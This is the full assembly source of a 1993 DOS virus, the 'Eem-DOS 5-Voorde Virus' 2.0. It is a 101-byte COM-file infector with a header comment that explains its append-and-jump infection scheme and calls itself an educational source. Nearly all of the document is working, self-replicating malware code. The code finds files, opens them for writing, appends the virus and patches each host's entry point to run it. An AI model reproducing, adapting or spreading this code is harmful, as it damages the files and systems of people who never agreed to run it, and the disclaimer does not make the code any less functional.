;               The Eem-DOS 5-Voorde Virus version 2.0
;
; Smallest (101 bytes) COM file infector which works with te folowing
; principe:
;
; Before:
;    _____________________  ____________
;   [first 3 bytes of file][rest of file]
;
; After:
;    ____________  ____________  _____  _____________________
;   [jmp to virus][rest of file][virus][first 3 bytes of file]
;
; This way the virus can restore the first 3 bytes of the file so
; the file will still work.
;
; If you want no registers to change you can add some pushes, but
; it'll make the virus much larger.....
;
;       (C)1993 by [D‡RkR‡Y] / TridenT
;
; BTW This is only a educational source, and this virus should not be
; spread, you may publish this file in it's original form.
; If you intend to spread this virus you will take all the responsibilities
; on youself so the author will not get into trubble.
; If you do not agree with this, destroy this file now.
;
_CODE   SEGMENT
        ASSUME  CS:_CODE

        ORG     100h

        LEN     EQU THE_END - VX                ; This bab's length

START:
        DB      0E9h,0,0                        ; Jump te virus. (carrier
                                                ; program)
VX:
        PUSH    SI                              ; Put 100h in DI and save
        PUSH    SI                              ; it as return point.
        POP     DI                              ;

        CALL    RELATIVE                        ;
RELATIVE:                                       ; Calculate where the old 3
        POP     SI                              ; bytes are stored.
        ADD     SI,(OLD_BYTES - RELATIVE)       ;

        PUSH    SI                              ; Save it for later.

        MOV     CL,3                            ; Restore the first 3 bytes.
        REP     MOVSB                           ;

        MOV     DX,SI                           ; Set DX to file spec.

        POP     SI                              ; Restore SI

        DEC     AX                              ;
AGAIN:  ADD     AH,4Fh                          ; Search for (next) file
        INT     21h                             ; and exit if non found.
        JC      EXIT                            ;

        MOV     DI,SI                           ; Put SI in DI

        MOV     AH,3Eh                          ; Close open file. (also
        CALL    OPEN                            ; nice anti-debug trick!)

        MOV     AH,3Fh                          ; Read first 3 bytes.
        CALL    IO                              ;

        CMP     BYTE PTR [DI],0E9h              ; Next file if first instr.
        JE      AGAIN                           ; is a JMP FAR. (marker)

        MOV     AX,4202h                        ;
        XOR     CX,CX                           ; Goto EOF.
        CWD                                     ;
        INT     21h                             ;

        SUB     AX,3                            ;
        ADD     DI,8                            ; Set JMP to virus.
        MOV     WORD PTR DS:[DI],AX             ;

        MOV     AH,40h                          ;
        MOV     CL,LEN                          ; Write virus and open
        MOV     DX,DI                           ; file again.
        SUB     DX,(OLD_BYTES - VX) + 8         ;
        CALL    OPEN                            ;

        DEC     DI                              ; Write JMP
        MOV     AH,40h                          ;
IO:
        MOV     CL,3                            ;
        MOV     DX,DI                           ; Read or write 3 bytes.
        INT     21h                             ;
EXIT:
        RET                                     ; Start carrier program.

OPEN:
        INT     21h                             ;
        MOV     AX,3D02h                        ;
        MOV     DX,9Eh                          ; Open file.
        INT     21h                             ;
        XCHG    BX,AX                           ;
        RET

OLD_BYTES:      NOP                             ;
                NOP                             ; First 3 bytes of carrier
                RET                             ; program.

FILE_NAME:      DB      '*.*',0h                ; File to search for (all)

NEW_BYTES       DB      0E9h                    ; JMP to virus buffer.

THE_END:

_CODE   ENDS
        END     START
